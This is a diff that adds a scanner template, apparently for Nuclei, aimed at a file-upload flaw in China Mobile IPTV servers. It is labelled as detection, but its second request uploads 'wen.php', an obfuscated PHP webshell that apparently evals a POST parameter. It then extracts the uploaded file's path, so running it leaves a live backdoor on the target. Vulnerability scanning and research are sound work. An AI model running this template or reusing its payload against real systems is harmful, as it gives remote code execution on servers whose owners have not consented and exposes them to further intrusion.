@@ -1,0 +1,56 @@
+id: china-mobile-iptv-getshell
+info:
+  name: China Mobile IPTV Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects an arbitrary file upload vulnerability in China Mobile IPTV servers, which could lead to remote code execution (webshell upload).
+  tags: file-upload,rce
+  reference:
+    - http://www.10086.cn/
+
+http:
+  - name: test-upload-page
+    method: GET
+    path:
+      - '{{BaseURL}}/ZHGXTV/index.php/Admin/Common/test'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ">开始上传</button>"
+
+  - name: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/ZHGXTV/index.php/admin/common/uploadfile.html'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxcexPspczP3BiouN
+    body: |
+      ------WebKitFormBoundaryxcexPspczP3BiouN
+      Content-Disposition: form-data; name="file"; filename="wen.php"
+      Content-Type: application/octet-stream
+
+      <?php $mt="mFsKCleRfU"; $ojj="IEBleldle"; $hsa="E9TVFsnd2VuJ10p"; $fnx="Ow=="; $zk = str_replace("d","","sdtdrd_redpdldadcde"); $ef = $zk("z", "", "zbazsze64_zdzeczodze"); $dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn"); $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx))); $zvm(); ?>
+      ------WebKitFormBoundaryxcexPspczP3BiouN--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "true"
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '"filePath":"(.*?)"'
+flow: |
+  http(0) && http(1)
